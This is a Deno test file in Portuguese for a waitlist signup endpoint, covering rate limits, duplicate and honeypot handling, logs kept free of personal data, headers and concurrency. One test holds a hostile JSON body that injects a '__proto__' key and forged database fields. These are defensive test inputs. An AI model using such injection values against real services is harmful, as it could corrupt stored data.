Deno.test(`no máximo ${LIMITE_POR_HORA} envios por ip_hash por hora`, async () => {
  const { tratar, supabase, avancar } = montar();
  const enviar = async (n: number, ip = IP) => {
    const resposta = await tratar(pedido({ ...VALIDA, email: `pessoa${n}@empresa.com.br` }, { ip }));
    await resposta.body?.cancel();
    return resposta;
  };
  for (let n = 1; n <= LIMITE_POR_HORA; n++) assert.equal((await enviar(n)).status, 200);
  const bloqueado = await tratar(pedido({ ...VALIDA, email: "pessoa4@empresa.com.br" }));
  assert.equal(bloqueado.status, 429);
  assert.equal(bloqueado.headers.get("retry-after"), "3600");
  assert.equal(bloqueado.headers.get("access-control-allow-origin"), ORIGEM);
  assert.deepEqual(await json(bloqueado), { ok: false, erro: "limite" });
  assert.equal(supabase.linhas.length, LIMITE_POR_HORA);
  assert.equal((await enviar(5, "198.51.100.20")).status, 200); // outro IP, outro balde

  // a consulta é a do índice lista_espera_ip_recente: ip_hash e criado_em da última hora
  const consulta = supabase.consultas.at(-1)!;
  assert.equal(consulta.tabela, "lista_espera");
  assert.equal(consulta.colunas, "id");
  assert.deepEqual(consulta.opcoes, { count: "exact", head: true });
  assert.equal(consulta.filtros[1][2], new Date(INICIO - HORA).toISOString());

  avancar(HORA + 1);
  assert.equal((await enviar(6)).status, 200); // a janela andou
});

Deno.test("IPv6: endereços do mesmo /64 dividem o limite", async () => {
  const { tratar, supabase } = montar();
  for (let n = 1; n <= LIMITE_POR_HORA + 1; n++) {
    const ip = `2001:db8:abcd:12::${n.toString(16)}`;
    const resposta = await tratar(pedido({ ...VALIDA, email: `v6-${n}@empresa.com.br` }, { ip }));
    assert.equal(resposta.status, n <= LIMITE_POR_HORA ? 200 : 429, ip);
    await resposta.body?.cancel();
  }
  assert.ok(supabase.linhas.every((l) => l.ip_hash === HASH_DO_PREFIXO));
});

// --- Banco --------------------------------------------------------------------------------
Deno.test("e-mail repetido responde igual a uma inscrição nova e não grava de novo", async () => {
  const { tratar, supabase, avancar } = montar();
  const primeira = await tratar(pedido());
  avancar(1000);
  const repetida = await tratar(pedido({ ...VALIDA, email: "MARIA.Silva@Cooperativa.com.br", nome: "Outra Pessoa" }));
  const isca = await tratar(pedido({ ...VALIDA, website: "x" }));
  for (const resposta of [primeira, repetida, isca]) {
    assert.equal(resposta.status, 200);
    assert.equal(await resposta.text(), '{"ok":true}');
  }
  assert.deepEqual([...primeira.headers], [...repetida.headers]);
  assert.equal(supabase.linhas.length, 1);
  assert.equal(supabase.linhas[0].nome, "Maria da Silva"); // a linha antiga não muda
});

Deno.test("campos extras do corpo nunca chegam ao banco", async () => {
  const { tratar, supabase } = montar();
  const extras = JSON.stringify({
    ...VALIDA,
    id: "00000000-0000-0000-0000-000000000000",
    criado_em: "2000-01-01T00:00:00Z",
    consentimento_em: "2000-01-01T00:00:00Z",
    ip_hash: "a".repeat(64),
    constructor: "x",
  });
  // "__proto__" vira uma chave própria no JSON.parse e não pode trocar nenhum campo
  const bruto = extras.replace(/^\{/, '{"__proto__":{"segmento":"outro","ip_hash":"b"},');
  const resposta = await tratar(pedido(undefined, { bruto }));
  assert.equal(resposta.status, 200);
  await resposta.body?.cancel();
  assert.deepEqual(Object.keys(supabase.insercoes[0].linha).sort(), [
    "cargo",
    "consentimento_lgpd",
    "email",
    "empresa",
    "interesses",
    "ip_hash",
    "nome",
    "origem",
    "segmento",
  ]);
  assert.equal(supabase.insercoes[0].linha.ip_hash, HASH_DO_IP);
  assert.equal(supabase.insercoes[0].tabela, "lista_espera");
});

Deno.test("erro do banco: 503 e o log leva só o código", async () => {
  for (const falhas of [{ contagem: "PGRST301" }, { insercao: "23514" }, { insercao: "mensagem com maria@x.com" }]) {
    const { tratar, logs } = montar({ falhas });
    const resposta = await tratar(pedido());
    assert.equal(resposta.status, 503, JSON.stringify(falhas));
    assert.deepEqual(await json(resposta), { ok: false, erro: "indisponivel" });
    const erro = logs.find((l) => l.includes("erro_banco"));
    assert.ok(erro);
    assert.match(erro, /"codigo":"(PGRST301|23514|outro)"/);
    assert.doesNotMatch(logs.join("\n"), /maria@x\.com/);
  }
});

Deno.test("erro inesperado: 500 genérico e o log só com o tipo do erro", async () => {
  const logs: string[] = [];
  const tratar = criarTratador({
    env: (nome) => ({ TURNSTILE_SECRET_KEY: SEGREDO, IP_HASH_SALT: SAL } as Record<string, string>)[nome],
    banco: {
      contarRecentes: () => Promise.reject(new TypeError(`falhou para ${VALIDA.email}`)),
      inserir: () => Promise.resolve({ resultado: "nova", id: "x" }),
      remover: () => Promise.resolve(),
    },
    fetch: turnstileFalso().fetch,
    log: (evento, detalhes = {}) => logs.push(JSON.stringify({ evento, ...detalhes })),
  });
  const resposta = await tratar(pedido());
  assert.equal(resposta.status, 500);
  assert.deepEqual(await json(resposta), { ok: false, erro: "interno" });
  assert.deepEqual(logs, ['{"evento":"erro_inesperado","tipo":"TypeError"}']);
});

// --- Logs e chaves ----------------------------------------------------------------------------
Deno.test("nenhum log traz e-mail, nome, IP, ip_hash, token nem segredos", async () => {
  const { tratar, logs } = montar({
    turnstile: [{ json: { success: false, "error-codes": ["invalid-input-response"] } }],
  });
  const fluxos: [unknown, OpcoesPedido][] = [
    [VALIDA, {}], // Turnstile recusa
    [{ ...VALIDA, nome: "M" }, {}], // campo inválido
    [{ ...VALIDA, website: "isca" }, {}],
    [VALIDA, { origem: "https://golpe.exemplo" }],
    [VALIDA, { metodo: "GET" }],
  ];
  for (const [corpo, opcoes] of fluxos) await (await tratar(pedido(corpo, opcoes))).body?.cancel();
  const outro = montar();
  for (let n = 0; n < LIMITE_POR_HORA + 2; n++) await (await outro.tratar(pedido())).body?.cancel();
  const todos = [...logs, ...outro.logs].join("\n");
  assert.ok(todos.length > 0);
  for (
    const sensivel of [
      VALIDA.email,
      "maria",
      "Maria",
      IP,
      HASH_DO_IP,
      VALIDA.turnstile,
      SEGREDO,
      SAL,
      "cooperativa.com.br",
    ]
  ) {
    assert.equal(todos.toLowerCase().includes(sensivel.toLowerCase()), false, `log com ${sensivel}`);
  }
});

Deno.test("chave do service_role: a default de SUPABASE_SECRET_KEYS, senão a SUPABASE_SERVICE_ROLE_KEY", () => {
  const de = (env: Record<string, string>) => chaveDeServico((nome) => env[nome]);
  assert.equal(de({ SUPABASE_SERVICE_ROLE_KEY: "legada", SUPABASE_SECRET_KEYS: '{"default":" nova "}' }), "nova");
  assert.equal(de({ SUPABASE_SECRET_KEYS: '{"default":"nova","outra":"x"}' }), "nova");
  assert.equal(de({ SUPABASE_SERVICE_ROLE_KEY: " legada ", SUPABASE_SECRET_KEYS: '{"outra":"x"}' }), "legada");
  assert.equal(de({ SUPABASE_SERVICE_ROLE_KEY: "legada", SUPABASE_SECRET_KEYS: "não é json" }), "legada");
  assert.equal(de({ SUPABASE_SECRET_KEYS: "não é json" }), null);
  assert.equal(de({ SUPABASE_SERVICE_ROLE_KEY: "  " }), null);
  assert.equal(de({}), null);
});

Deno.test("respostas JSON sem cache, com nosniff e Vary: Origin", async () => {
  const { tratar } = montar();
  for (const corpo of [VALIDA, { ...VALIDA, nome: "" }]) {
    const resposta = await tratar(pedido(corpo));
    assert.equal(resposta.headers.get("content-type"), "application/json; charset=utf-8");
    assert.equal(resposta.headers.get("cache-control"), "no-store");
    assert.equal(resposta.headers.get("x-content-type-options"), "nosniff");
    assert.equal(resposta.headers.get("vary"), "Origin");
    await resposta.body?.cancel();
  }
});

Deno.test("envios simultâneos do mesmo IP não passam do limite (grava, reconta e desfaz)", async () => {
  for (const latenciaMaxima of [0, 3, 12]) {
    const { tratar, supabase, logs } = montar({ latencia: () => Math.random() * latenciaMaxima });
    const respostas = await Promise.all(
      Array.from({ length: 20 }, (_, n) => tratar(pedido({ ...VALIDA, email: `bot${n}@exemplo.com.br` }))),
    );
    const status = respostas.map((r) => r.status);
    await Promise.all(respostas.map((r) => r.body?.cancel()));
    assert.ok(
      supabase.linhas.length <= LIMITE_POR_HORA,
      `latência ${latenciaMaxima}: ${supabase.linhas.length} linhas`,
    );
    assert.equal(status.filter((s) => s === 200).length, supabase.linhas.length);
    assert.ok(status.every((s) => s === 200 || s === 429), status.join(","));
    // as removidas foram só pelo id, e só as que esta função gravou
    assert.ok(supabase.remocoes.every((r) => r.filtro[0] === "id"));
    if (supabase.remocoes.length) assert.match(logs.join("\n"), /limite_por_hora_simultaneo/);
  }
});

Deno.test("corpo que para no meio ou demora demais: 400, sem erro no log", async () => {
  const quebrado = new ReadableStream<Uint8Array>({
    pull(controle) {
      controle.error(new TypeError("conexão caiu"));
    },
  });
  const lento = new ReadableStream<Uint8Array>({ start() {/* nunca manda nada */} });
  for (const bruto of [quebrado, lento]) {
    const { tratar, turnstile, logs } = montar({ prazoCorpoMs: 50 });
    const resposta = await tratar(pedido(VALIDA, { bruto }));
    assert.equal(resposta.status, 400);
    assert.deepEqual(await json(resposta), { ok: false, erro: "interrompido" });
    assert.equal(turnstile.chamadas.length, 0);
    assert.ok(logs.every((l) => !l.includes('"nivel":"erro"')), logs.join("\n"));
  }
});

Deno.test("o mesmo sal com espaço ou quebra de linha no fim dá o mesmo ip_hash", async () => {
  for (const sal of [SAL, `${SAL}\n`, `  ${SAL}  `]) {
    const { tratar, supabase } = montar({ env: { IP_HASH_SALT: sal } });
    await (await tratar(pedido())).body?.cancel();
    assert.equal(supabase.linhas[0].ip_hash, HASH_DO_IP, JSON.stringify(sal));
  }
});

Deno.test("se a linha que passou do limite não puder ser desfeita: 503 e o código no log", async () => {
  const { tratar, logs } = montar({ falhas: { remocao: "42501" }, latencia: () => 2 });
  const respostas = await Promise.all(
    Array.from({ length: 6 }, (_, n) => tratar(pedido({ ...VALIDA, email: `r${n}@exemplo.com.br` }))),
  );
  const status = respostas.map((r) => r.status);
  await Promise.all(respostas.map((r) => r.body?.cancel()));
  assert.ok(status.every((s) => [200, 429, 503].includes(s)), status.join(","));
  if (status.includes(503)) assert.match(logs.join("\n"), /"evento":"erro_banco","nivel":"erro","codigo":"42501"/);
});
